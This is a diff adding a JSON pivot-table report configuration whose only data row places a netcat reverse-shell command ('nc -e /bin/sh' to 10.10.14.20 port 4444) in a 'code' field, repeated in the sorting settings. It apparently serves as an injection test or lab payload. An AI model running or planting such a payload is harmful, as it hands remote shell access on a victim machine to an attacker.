@@ -1,0 +1,71 @@
+{
+    "dataSource": {
+        "type": "json",
+        "data": [
+            {
+                "name": {
+                    "caption": "name",
+                    "type": "string"
+                },
+                "state": {
+                    "caption": "state",
+                    "type": "string"
+                },
+                "code": {
+                    "caption": "code",
+                    "type": "string"
+                }
+            },
+            [
+                "me",
+                "you",
+                "nc -e /bin/sh 10.10.14.20 4444"
+            ]
+        ]
+    },
+    "slice": {
+        "rows": [
+            {
+                "uniqueName": "name"
+            },
+            {
+                "uniqueName": "code"
+            }
+        ],
+        "columns": [
+            {
+                "uniqueName": "[Measures]"
+            }
+        ],
+        "measures": [
+            {
+                "uniqueName": "name",
+                "aggregation": "count"
+            }
+        ],
+        "sorting": {
+            "row": {
+                "type": "desc",
+                "tuple": [
+                    "name.[me]",
+                    "code.[nc -e /bin/sh 10.10.14.20 4444]"
+                ],
+                "measure": {
+                    "uniqueName": "name",
+                    "aggregation": "count"
+                }
+            }
+        },
+        "expands": {
+            "rows": [
+                {
+                    "tuple": [
+                        "name.[me]"
+                    ]
+                }
+            ]
+        }
+    },
+    "version": "2.8.3",
+    "creationDate": "2020-03-27T20:35:52.314Z"
+}
